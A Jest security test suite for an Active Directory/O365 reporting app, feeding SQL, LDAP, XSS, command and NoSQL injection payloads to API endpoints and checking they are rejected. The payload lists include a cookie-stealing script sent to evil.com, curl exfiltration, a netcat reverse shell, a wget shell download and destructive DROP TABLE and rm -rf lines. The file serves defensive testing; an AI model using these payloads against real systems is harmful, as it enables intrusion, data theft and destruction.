/**
 * Injection Vulnerability Test Suite
 * 
 * Comprehensive testing for SQL, LDAP, XSS, and other injection vulnerabilities
 * in the AD/Azure AD/O365 reporting application.
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import request from 'supertest';
import app from '@/app';
import { db } from '@/config/database';
import { logger } from '@/utils/logger';

interface InjectionTestContext {
  validToken: string;
  testUserId: number;
}

class InjectionTestRunner {
  private context: InjectionTestContext = {} as InjectionTestContext;

  async setup(): Promise<void> {
    // Create test user and generate token
    const userResult = await db.query(`
      INSERT INTO users (username, password_hash, email, is_active, is_admin, auth_source)
      VALUES ($1, $2, $3, $4, $5, $6)
      RETURNING id
    `, ['injection_test_user', 'hashed_password', 'injection-test@example.com', true, false, 'local']);
    
    this.context.testUserId = userResult.rows[0].id;
    
    // Generate JWT token
    const jwt = require('jsonwebtoken');
    this.context.validToken = jwt.sign(
      { 
        userId: this.context.testUserId, 
        username: 'injection_test_user',
        isAdmin: false,
        authSource: 'local'
      },
      process.env.JWT_SECRET || 'test-secret',
      { expiresIn: '1h' }
    );
  }

  async cleanup(): Promise<void> {
    try {
      await db.query('DELETE FROM users WHERE username = $1', ['injection_test_user']);
      await db.query('DELETE FROM report_history WHERE user_id = $1', [this.context.testUserId]);
    } catch (error) {
      logger.warn('Cleanup error:', error);
    }
  }

  // =====================================================
  // SQL INJECTION ATTACK VECTORS
  // =====================================================

  async testSQLInjectionVectors(): Promise<void> {
    const sqlPayloads = {
      // Time-based blind SQL injection
      timeBasedBlind: [
        "'; WAITFOR DELAY '00:00:05' --",
        "'; SELECT pg_sleep(5) --",
        "' AND (SELECT COUNT(*) FROM pg_sleep(5)) > 0 --",
        "'; IF (1=1) WAITFOR DELAY '00:00:05' --"
      ],
      
      // Boolean-based blind SQL injection
      booleanBlind: [
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND (SELECT SUBSTRING(password_hash,1,1) FROM users WHERE username='admin') = 'a' --",
        "' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1) > 64 --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
      ],
      
      // Union-based SQL injection
      unionBased: [
        "' UNION SELECT username, password_hash, email, null FROM users --",
        "' UNION SELECT table_name, column_name, null, null FROM information_schema.columns --",
        "' UNION SELECT database(), user(), version(), null --",
        "' UNION SELECT 1, (SELECT string_agg(tablename, ',') FROM pg_tables), 3, 4 --"
      ],
      
      // Error-based SQL injection
      errorBased: [
        "' AND EXTRACTVALUE(null, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t GROUP BY CONCAT((SELECT version()), FLOOR(RAND(0)*2))) --",
        "' AND (CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))) --"
      ],
      
      // Stacked queries
      stackedQueries: [
        "'; DROP TABLE users; --",
        "'; INSERT INTO users (username, is_admin) VALUES ('hacker', true); --",
        "'; UPDATE users SET is_admin = true WHERE username = 'test'; --",
        "'; CREATE TABLE evil (id int, data text); --",
        "'; DELETE FROM report_history; --"
      ],
      
      // Second-order SQL injection
      secondOrder: [
        "admin'; DROP TABLE users; --",
        "test' OR '1'='1",
        "'; INSERT INTO audit_logs (message) VALUES ('hacked'); --"
      ]
    };

    describe('SQL Injection Attack Vectors', () => {
      Object.entries(sqlPayloads).forEach(([category, payloads]) => {
        describe(`${category} SQL injection`, () => {
          payloads.forEach((payload, index) => {
            test(`Should prevent ${category} attack ${index + 1}`, async () => {
              const testEndpoints = [
                { method: 'GET', url: '/api/search', query: { q: payload, type: 'users' } },
                { method: 'GET', url: '/api/logs', query: { username: payload } },
                { method: 'GET', url: '/api/reports', query: { sortBy: payload } },
                { method: 'POST', url: '/api/reports/execute/1', body: { 
                  filters: [{ field: 'username', operator: 'equals', value: payload }] 
                }},
                { method: 'POST', url: '/api/reports/custom', body: { 
                  name: payload,
                  query: { source: 'ad', fields: ['username'] }
                }}
              ];

              for (const endpoint of testEndpoints) {
                const req = request(app)[endpoint.method.toLowerCase() as 'get' | 'post'](endpoint.url)
                  .set('Authorization', `Bearer ${this.context.validToken}`);

                if (endpoint.query) {
                  req.query(endpoint.query);
                }
                if (endpoint.body) {
                  req.send(endpoint.body);
                }

                const response = await req;

                // Check that the response doesn't indicate successful SQL injection
                expect(response.status).not.toBe(500); // No database errors
                
                const responseText = JSON.stringify(response.body);
                
                // Should not return sensitive database information
                expect(responseText).not.toMatch(/password_hash|pg_|information_schema|sysobjects/i);
                
                // Should not show evidence of successful injection
                expect(responseText).not.toMatch(/table.*dropped|syntax error|ORA-|mysql|postgresql/i);
                
                // Should not contain evidence of time delays (this is harder to test)
                if (category === 'timeBasedBlind') {
                  const startTime = Date.now();
                  await req;
                  const duration = Date.now() - startTime;
                  expect(duration).toBeLessThan(3000); // Should not delay significantly
                }
              }
            });
          });
        });
      });
    });
  }

  // =====================================================
  // LDAP INJECTION ATTACK VECTORS
  // =====================================================

  async testLDAPInjectionVectors(): Promise<void> {
    const ldapPayloads = {
      // Authentication bypass
      authBypass: [
        "admin)(|(password=*))",
        "*)(&(objectClass=user)(cn=admin))",
        "*)(cn=admin))(&(|(cn=*",
        "admin)(&(objectClass=user)(userpassword=*))"
      ],
      
      // Information disclosure
      infoDisclosure: [
        "*)(&(objectClass=*)",
        "*)(|(objectClass=user)(objectClass=computer))",
        "*)(&(objectClass=organizationalUnit)",
        "*)(objectClass=domain)(&(|(cn=*"
      ],
      
      // Filter injection
      filterInjection: [
        "\\2a)(|(objectClass=*",
        "admin*)(|(objectClass=user)",
        "test)(|(cn=*)",
        "*))%00"
      ],
      
      // Blind LDAP injection
      blindInjection: [
        "*)(cn=a*",
        "*)(cn=admin)",
        "*)(|(cn=a*)(cn=b*)",
        "*)(userpassword=*"
      ]
    };

    describe('LDAP Injection Attack Vectors', () => {
      Object.entries(ldapPayloads).forEach(([category, payloads]) => {
        describe(`${category} LDAP injection`, () => {
          payloads.forEach((payload, index) => {
            test(`Should prevent ${category} attack ${index + 1}`, async () => {
              const testEndpoints = [
                { 
                  method: 'POST', 
                  url: '/api/auth/login', 
                  body: { username: payload, password: 'password' } 
                },
                { 
                  method: 'POST', 
                  url: '/api/reports/execute/inactive_users', 
                  body: { parameters: { username: payload } } 
                },
                { 
                  method: 'GET', 
                  url: '/api/search', 
                  query: { q: payload, type: 'ad_users' } 
                }
              ];

              for (const endpoint of testEndpoints) {
                const req = request(app)[endpoint.method.toLowerCase() as 'get' | 'post'](endpoint.url);
                
                if (endpoint.url !== '/api/auth/login') {
                  req.set('Authorization', `Bearer ${this.context.validToken}`);
                }

                if (endpoint.query) {
                  req.query(endpoint.query);
                }
                if (endpoint.body) {
                  req.send(endpoint.body);
                }

                const response = await req;
                const responseText = JSON.stringify(response.body);

                // Should not return LDAP-specific errors or data
                expect(responseText).not.toMatch(/LDAP|distinguishedName|objectClass|cn=|ou=/i);
                
                // Should not show successful authentication bypass
                if (endpoint.url === '/api/auth/login') {
                  expect(response.status).toBe(401);
                  expect(response.body).not.toHaveProperty('token');
                }
                
                // Should not expose directory structure
                expect(responseText).not.toMatch(/DC=|OU=|CN=.*,/i);
              }
            });
          });
        });
      });
    });
  }

  // =====================================================
  // XSS ATTACK VECTORS
  // =====================================================

  async testXSSVectors(): Promise<void> {
    const xssPayloads = {
      // Script-based XSS
      scriptBased: [
        "<script>alert('XSS')</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<script>document.location='http://evil.com/'+document.cookie</script>",
        "javascript:alert('XSS')"
      ],
      
      // Event-based XSS
      eventBased: [
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>"
      ],
      
      // Encoded XSS
      encoded: [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e"
      ],
      
      // Filter bypass XSS
      filterBypass: [
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<<SCRIPT>alert('XSS')//<</SCRIPT>",
        "<img src=\"javascript:alert('XSS')\">",
        "<svg/onload=alert('XSS')>",
        "<iframe srcdoc=\"<script>alert('XSS')</script>\">",
        "data:text/html,<script>alert('XSS')</script>"
      ],
      
      // DOM-based XSS
      domBased: [
        "#<script>alert('XSS')</script>",
        "javascript:alert('XSS')//",
        "vbscript:msgbox('XSS')",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
      ]
    };

    describe('XSS Attack Vectors', () => {
      Object.entries(xssPayloads).forEach(([category, payloads]) => {
        describe(`${category} XSS`, () => {
          payloads.forEach((payload, index) => {
            test(`Should prevent ${category} XSS attack ${index + 1}`, async () => {
              const testEndpoints = [
                { 
                  method: 'POST', 
                  url: '/api/reports/custom', 
                  body: { 
                    name: payload,
                    description: payload,
                    query: { source: 'ad', fields: ['username'] }
                  } 
                },
                { 
                  method: 'GET', 
                  url: '/api/search', 
                  query: { q: payload, type: 'users' } 
                },
                { 
                  method: 'POST', 
                  url: '/api/logs', 
                  body: { message: payload } 
                },
                { 
                  method: 'POST', 
                  url: '/api/reports/execute/1', 
                  body: { 
                    filters: [{ field: 'description', operator: 'contains', value: payload }] 
                  } 
                }
              ];

              for (const endpoint of testEndpoints) {
                const req = request(app)[endpoint.method.toLowerCase() as 'get' | 'post'](endpoint.url)
                  .set('Authorization', `Bearer ${this.context.validToken}`);

                if (endpoint.query) {
                  req.query(endpoint.query);
                }
                if (endpoint.body) {
                  req.send(endpoint.body);
                }

                const response = await req;
                const responseText = JSON.stringify(response.body);

                // Should not contain unescaped script tags or event handlers
                expect(responseText).not.toMatch(/<script[^>]*>/i);
                expect(responseText).not.toMatch(/javascript:/i);
                expect(responseText).not.toMatch(/on\w+=/i);
                expect(responseText).not.toMatch(/<iframe[^>]*>/i);
                expect(responseText).not.toMatch(/<svg[^>]*onload/i);
                
                // Should properly encode/escape HTML entities
                if (responseText.includes('&lt;') || responseText.includes('&#')) {
                  expect(responseText).not.toContain('<script>');
                }
                
                // Check Content-Type header for JSON responses
                if (response.headers['content-type']?.includes('application/json')) {
                  expect(response.headers['content-type']).toContain('application/json');
                }
              }
            });
          });
        });
      });
    });
  }

  // =====================================================
  // COMMAND INJECTION VECTORS
  // =====================================================

  async testCommandInjectionVectors(): Promise<void> {
    const commandPayloads = [
      "; cat /etc/passwd",
      "| ls -la /",
      "&& whoami",
      "`id`",
      "$(uname -a)",
      "; ping -c 1 evil.com",
      "| curl evil.com/collect?data=$(whoami)",
      "&& rm -rf /tmp/*",
      "; nc -e /bin/sh evil.com 4444",
      "$(wget http://evil.com/shell.sh -O /tmp/shell.sh)",
      "|powershell -c Get-Process",
      "&dir c:\\",
      ";type c:\\windows\\system32\\drivers\\etc\\hosts"
    ];

    describe('Command Injection Vectors', () => {
      commandPayloads.forEach((payload, index) => {
        test(`Should prevent command injection ${index + 1}: ${payload.substring(0, 20)}`, async () => {
          const testEndpoints = [
            { 
              method: 'POST', 
              url: '/api/reports/execute/1', 
              body: { parameters: { path: payload, filename: payload } } 
            },
            { 
              method: 'GET', 
              url: '/api/export/report', 
              query: { filename: payload } 
            },
            { 
              method: 'POST', 
              url: '/api/reports/custom', 
              body: { 
                name: 'test',
                query: { source: 'ad', fields: [payload] }
              } 
            }
          ];

          for (const endpoint of testEndpoints) {
            const req = request(app)[endpoint.method.toLowerCase() as 'get' | 'post'](endpoint.url)
              .set('Authorization', `Bearer ${this.context.validToken}`);

            if (endpoint.query) {
              req.query(endpoint.query);
            }
            if (endpoint.body) {
              req.send(endpoint.body);
            }

            const response = await req;
            const responseText = JSON.stringify(response.body);

            // Should not return command execution results
            expect(responseText).not.toMatch(/uid=|gid=|total \d+|drwx|root:|bin\/bash/i);
            expect(responseText).not.toMatch(/Microsoft Windows|Volume in drive|Directory of/i);
            expect(responseText).not.toMatch(/\[.*\]#|\$\s/); // Shell prompts
            
            // Should not show network activity results
            expect(responseText).not.toMatch(/PING|64 bytes from|packets transmitted/i);
            
            // Should handle malicious input gracefully
            expect(response.status).not.toBe(500);
          }
        });
      });
    });
  }

  // =====================================================
  // NOSQL INJECTION VECTORS
  // =====================================================

  async testNoSQLInjectionVectors(): Promise<void> {
    const nosqlPayloads = [
      { $ne: null },
      { $regex: ".*" },
      { $where: "this.username === 'admin'" },
      { $gt: "" },
      { $or: [{ username: "admin" }, { isAdmin: true }] },
      { username: { $in: ["admin", "root", "administrator"] } },
      { $expr: { $eq: ["$username", "admin"] } },
      { password: { $exists: true } },
      { $text: { $search: "admin" } },
      "'; return db.users.find(); var dummy = '",
      { $eval: "db.users.find()" },
      { $javascript: "function() { return db.users.find(); }" }
    ];

    describe('NoSQL Injection Vectors', () => {
      nosqlPayloads.forEach((payload, index) => {
        test(`Should prevent NoSQL injection ${index + 1}`, async () => {
          const testEndpoints = [
            { 
              method: 'POST', 
              url: '/api/search', 
              body: { query: payload } 
            },
            { 
              method: 'POST', 
              url: '/api/reports/execute/1', 
              body: { 
                filters: [{ field: 'username', operator: 'equals', value: payload }] 
              } 
            },
            { 
              method: 'GET', 
              url: '/api/reports', 
              query: { filter: JSON.stringify(payload) } 
            }
          ];

          for (const endpoint of testEndpoints) {
            const req = request(app)[endpoint.method.toLowerCase() as 'get' | 'post'](endpoint.url)
              .set('Authorization', `Bearer ${this.context.validToken}`);

            if (endpoint.query) {
              req.query(endpoint.query);
            }
            if (endpoint.body) {
              req.send(endpoint.body);
            }

            const response = await req;
            const responseText = JSON.stringify(response.body);

            // Should not return unauthorized data
            expect(responseText).not.toMatch(/password|secret|token|key/i);
            
            // Should handle malicious queries gracefully
            expect(response.status).not.toBe(500);
            
            // Should not execute JavaScript code
            expect(responseText).not.toMatch(/function.*return|db\./);
          }
        });
      });
    });
  }

  // =====================================================
  // MAIN TEST RUNNER
  // =====================================================

  async runAllInjectionTests(): Promise<void> {
    await this.testSQLInjectionVectors();
    await this.testLDAPInjectionVectors();
    await this.testXSSVectors();
    await this.testCommandInjectionVectors();
    await this.testNoSQLInjectionVectors();
  }
}

// Export for use in other test files
export { InjectionTestRunner };

// Main test execution
describe('Injection Vulnerability Test Suite', () => {
  let testRunner: InjectionTestRunner;

  beforeAll(async () => {
    testRunner = new InjectionTestRunner();
    await testRunner.setup();
  });

  afterAll(async () => {
    await testRunner.cleanup();
  });

  test('Execute all injection vulnerability tests', async () => {
    await testRunner.runAllInjectionTests();
  }, 120000); // 2 minute timeout for comprehensive injection tests
});